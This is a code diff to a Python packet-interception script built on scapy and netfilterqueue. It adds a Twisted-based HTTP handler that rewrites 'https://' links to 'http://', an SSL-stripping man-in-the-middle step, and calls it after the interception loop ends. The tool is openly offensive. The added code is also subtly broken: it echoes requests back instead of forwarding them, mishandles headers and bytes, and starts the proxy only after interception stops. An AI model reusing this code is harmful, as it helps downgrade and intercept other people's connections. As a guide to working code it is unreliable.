@@ -2,6 +2,35 @@ from scapy.all import *
 import os
 from netfilterqueue import NetfilterQueue
 import re
+from twisted.web import http
+
+
+class ProxyRequestHandler(http.Request):
+    def process(self):
+        self.content.seek(0, 0)
+        headers = self.getAllHeaders().copy()
+        requestContent = self.content.read()
+        headers['Content-Length'] = len(requestContent)
+
+        # Modify the request content here
+        requestContent = re.sub('https://', 'http://', requestContent)
+
+        self.setResponseCode(200, 'OK')
+        self.responseHeaders = headers
+        self.write(requestContent)
+        self.finish()
+
+class Proxy(http.HTTPChannel):
+    requestFactory = ProxyRequestHandler
+
+class ProxyFactory(http.HTTPFactory):
+    protocol = Proxy
+
+def start_proxy():
+    from twisted.internet import reactor
+    factory = ProxyFactory()
+    reactor.listenTCP(10000, factory)
+    reactor.run()
 
 def process_packet(packet):
     print("[+] Packet intercepted...")
@@ -65,6 +94,8 @@ def start():
     except KeyboardInterrupt:
         print("\n[-] Stopping packet interception...")
         queue.unbind()
+
+    start_proxy()
 
 if __name__ == "__main__":
     start()
